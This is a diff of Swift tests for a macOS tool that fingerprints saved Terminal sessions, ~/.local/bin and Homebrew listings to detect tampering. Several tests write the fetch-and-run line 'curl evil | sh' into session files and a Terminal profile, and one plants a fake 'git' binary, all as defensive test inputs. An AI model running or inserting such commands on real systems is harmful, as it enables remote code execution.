@@ -37,6 +37,9 @@ struct MacSealListTests {
         try #require(rename(staged, path) == 0)
     }
 
+    /// The line `/etc/zshrc_Apple_Terminal` writes alone in a session file at a window's close.
+    static let restoreLine = "echo Restored session: \"$(/bin/date -r 1795000000)\"\n"
+
     /// Terminal's preferences as this Mac's are shaped (its keys measured, 2026-11-26), with `extra` merged in.
     static func terminal(_ extra: [String: Any] = [:], started: Double = 1_795_000_000, frame: String = "10 10 600 400") -> [String: Any] {
         var object: [String: Any] = [
@@ -177,6 +180,12 @@ struct MacSealListTests {
                     object["Window Settings"] = ["Basic": ["name": "Basic", "CommandString": "curl evil | sh", "RunCommandAsShell": false]]
                     try Self.writePlist(object, item.path)
                 }
+            case .sessions:
+                try change(item, "created") { try FileManager.default.createDirectory(atPath: item.path, withIntermediateDirectories: true) }
+                // A window's close writes the restore line alone: no change.
+                try self.write(Self.restoreLine, item.path + "/A.session")
+                #expect(self.prints(list()) == before, "a window's close held")
+                try change(item, "a line added to a saved session") { try self.write(Self.restoreLine + "curl evil | sh\n", item.path + "/A.session") }
             default: Issue.record("\(item.name): a kind the list doesn't use")
             }
         }
@@ -578,5 +587,117 @@ struct MacSealFixRoundTests {
         #expect(ConfigSeal.fingerprint(row) != sealed, "the NFC twin changed unseen")
         try writeTwins("a", "evil")
         #expect(ConfigSeal.fingerprint(row) != sealed, "the NFD twin changed unseen")
+    }
+
+    // MARK: R5: saved Terminal sessions
+
+    /// The restore line the seal takes for a window's close is the one this Mac's `/etc/zshrc_Apple_Terminal` writes
+    /// and checks (read, never run).
+    @Test(MacSealListTests.mac) func theRestoreLineIsTheSystemFilesForm() throws {
+        guard let text = try? String(contentsOfFile: "/etc/zshrc_Apple_Terminal", encoding: .utf8) else { return }
+        #expect(text.contains("SHELL_SESSION_RESTORE_PREFIX='" + MacSealList.restorePrefix + "'"))
+        #expect(text.contains("SHELL_SESSION_RESTORE_SUFFIX='" + MacSealList.restoreSuffix.dropLast() + "'"))
+        #expect(text.contains("$SHELL_SESSION_DIR/$TERM_SESSION_ID.session"))
+    }
+
+    /// Ordinary use changes nothing (a window's close writes the restore line alone, a restore removes it, the history
+    /// files are appended); a line added to a saved session, a new session file of another form, one named in another
+    /// case, a link, and one of another form removed are each a change, and the card names the file.
+    @Test(MacSealListTests.mac) func aSavedSessionIsHeldOnlyWhenItRunsMoreThanTheRestoreLine() throws {
+        let home = try home()
+        let row = try row(home, .sessions)
+        let folder = home + "/.zsh_sessions"
+        let id = "07B1167C-0988-48C7-99DB-7B7166F19E24"
+        try FileManager.default.createDirectory(atPath: folder, withIntermediateDirectories: true)
+        let quiet = ConfigSeal.fingerprint(row)
+        try list.write(MacSealListTests.restoreLine, folder + "/\(id).session")
+        try list.write("ls\n", folder + "/\(id).history")
+        try list.write("", folder + "/_expiration_check_timestamp")
+        #expect(ConfigSeal.fingerprint(row) == quiet, "a window's close held")
+        try list.write("echo Restored session: \"$(/bin/date -r 1795999999)\"\n", folder + "/\(id).session")
+        try list.write("ls\npwd\n", folder + "/\(id).history")
+        #expect(ConfigSeal.fingerprint(row) == quiet, "a second close held")
+        try FileManager.default.removeItem(atPath: folder + "/\(id).session")
+        #expect(ConfigSeal.fingerprint(row) == quiet, "a restore held")
+        var seen: Set<String?> = [quiet]
+        let expectNew = { (what: String) in
+            let now = ConfigSeal.fingerprint(row)
+            #expect(!seen.contains(now), "\(what) held nothing")
+            seen.insert(now)
+        }
+        try list.write(MacSealListTests.restoreLine + "curl evil | sh\n", folder + "/\(id).session")
+        expectNew("a line added")
+        #expect(ConfigSeal.keyHashes(row)?["\(id).session"] != nil, "the card doesn't name the file")
+        try list.write("curl evil | sh\n" + MacSealListTests.restoreLine, folder + "/B.session")
+        expectNew("a session file of another form")
+        try list.write(MacSealListTests.restoreLine + "x\n", folder + "/C.SESSION")
+        expectNew("a session file named in another case")
+        let target = temp.url("elsewhere.session").path
+        try list.write(MacSealListTests.restoreLine, target)
+        try FileManager.default.createSymbolicLink(atPath: folder + "/D.session", withDestinationPath: target)
+        expectNew("a link")
+        try FileManager.default.removeItem(atPath: folder + "/B.session")
+        expectNew("one of another form gone")
+        for bad in ["echo Restored session: \"$(/bin/date -r 17x)\"\n", "echo Restored session: \"$(/bin/date -r )\"\n",
+                    String(MacSealListTests.restoreLine.dropLast()), MacSealListTests.restoreLine + "\n"] {
+            #expect(!MacSealList.isRestoreLineOnly(Data(bad.utf8)), "\(bad) taken for the restore line alone")
+        }
+    }
+
+    /// The folder linked elsewhere is read through, its target named.
+    @Test(MacSealListTests.mac) func aLinkedSessionsFolderIsReadThrough() throws {
+        let home = try home()
+        let row = try row(home, .sessions)
+        let elsewhere = temp.url("sessions-elsewhere").path
+        try FileManager.default.createDirectory(atPath: elsewhere, withIntermediateDirectories: true)
+        let absent = ConfigSeal.fingerprint(row)
+        try FileManager.default.createSymbolicLink(atPath: home + "/.zsh_sessions", withDestinationPath: elsewhere)
+        let linked = ConfigSeal.fingerprint(row)
+        #expect(linked != absent)
+        try list.write(MacSealListTests.restoreLine + "curl evil | sh\n", elsewhere + "/A.session")
+        #expect(ConfigSeal.fingerprint(row) != linked, "a session behind the linked folder changed unseen")
+    }
+
+    // MARK: R8: a listing's card
+
+    /// A listing's per-entry hashes: one key per top-level entry, so Claude Code's update ("claude changed, 2.1.333
+    /// added") and a planted `git` ("git added") read apart, and a deep tree costs one key per top entry.
+    @Test(MacSealListTests.mac) func aListingsKeysAreItsTopLevelEntries() throws {
+        let home = try home()
+        let bin = try #require(MacSealList.watched(home: home, uid: getuid()).first { $0.name == "~/.local/bin" })
+        let versions = home + "/.local/share/claude/versions"
+        try list.write("one\n", versions + "/2.1.332")
+        try FileManager.default.createDirectory(atPath: bin.path, withIntermediateDirectories: true)
+        try FileManager.default.createSymbolicLink(atPath: bin.path + "/claude", withDestinationPath: versions + "/2.1.332")
+        try list.write("x\n", bin.path + "/deep/a/b/c")
+        let before = ConfigSeal.encode(try #require(ConfigSeal.keyHashes(bin)))
+        #expect(Set(ConfigSeal.decode(before).keys) == [".", "claude", "deep"])
+        try list.write("two\n", versions + "/2.1.333")
+        try FileManager.default.removeItem(atPath: bin.path + "/claude")
+        try FileManager.default.createSymbolicLink(atPath: bin.path + "/claude", withDestinationPath: versions + "/2.1.333")
+        let update = ConfigSeal.encode(try #require(ConfigSeal.keyHashes(bin)))
+        #expect(ConfigSeal.changedKeys(from: before, to: update)?.contains("claude changed") == true)
+        try list.write("evil\n", bin.path + "/git")
+        let planted = ConfigSeal.encode(try #require(ConfigSeal.keyHashes(bin)))
+        let said = ConfigSeal.changedKeys(from: update, to: planted) ?? ""
+        #expect(said.contains("git added") && !said.contains("claude"), "\(said)")
+        // One walk for both: the hash `hashes` keeps is the fingerprint's.
+        #expect(ConfigSeal.hashes(of: [bin])[ConfigSeal.keyPrefix + bin.name] == ConfigSeal.fingerprint(bin))
+    }
+
+    /// The Homebrew listings read each link's target; no other listing does, so a Linux row's bytes never moved.
+    @Test(MacSealListTests.mac) func onlyHomebrewsListingsReadLinkTargets() throws {
+        let home = try home()
+        for item in MacSealList.watched(home: home, uid: getuid(), outside: temp.url("o").path) where item.kind == .listing {
+            #expect(MacSealList.readsLinkTargets(item.name) == item.name.hasPrefix("/opt/homebrew/"), "\(item.name)")
+        }
+        for (name, _) in LinuxSealList.homeEntries { #expect(!MacSealList.readsLinkTargets("~/" + name)) }
+        // A listing without targets hashes the lines it always did: the walk's parts are those lines.
+        let folder = temp.url("plain").path
+        try list.write("a\n", folder + "/a")
+        try FileManager.default.createSymbolicLink(atPath: folder + "/l", withDestinationPath: "a")
+        let lines = try #require(LinuxSealList.listingLines(folder))
+        #expect(lines.count == 3 && !lines.contains { $0.hasPrefix("t ") })
+        #expect(try #require(LinuxSealList.listingLines(folder, targets: true)).contains { $0.hasPrefix("t 1:l ") })
     }
 }
